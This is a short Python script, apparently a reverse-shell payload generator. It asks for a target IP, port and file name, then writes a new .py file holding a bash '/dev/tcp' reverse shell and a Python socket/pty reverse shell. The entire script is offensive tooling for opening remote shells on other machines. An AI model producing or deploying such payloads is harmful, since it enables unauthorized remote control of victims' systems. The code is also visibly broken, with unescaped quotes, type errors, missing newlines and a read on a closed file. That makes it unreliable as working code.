import os
import sys
import time
import random
import subprocess



addr = input("Target IPv4 address (ex: 10.10.10.10): ")
prt = input("\n Target port enter for default(10000): ")
name = input("Payload name")

file_path = name + ".py"
if prt == "":
  prt = 10000

payload = "bash -i >& /dev/tcp/" + addr + "/" + prt + " 0>&1"
payload2 = "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((addr,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")"
try:
  with open(file_path, 'w') as file:
      file.write("import sys\nimport os\nimport time\nimport random\nimport socket")
      file.write("try:")
      file.write("  os.system(" + payload + ")")
      file.write("except:")
      file.write("  print("Load 1 failed")")
    
      file.write("try:")
      file.write("  " + payload2)
      file.write("except:")
      file.write("  print("Load 2 failed, exiting")")
  print(f"File '{file_path}' created successfully, containing: " + file.read())

except:
  print("Unable to create file")


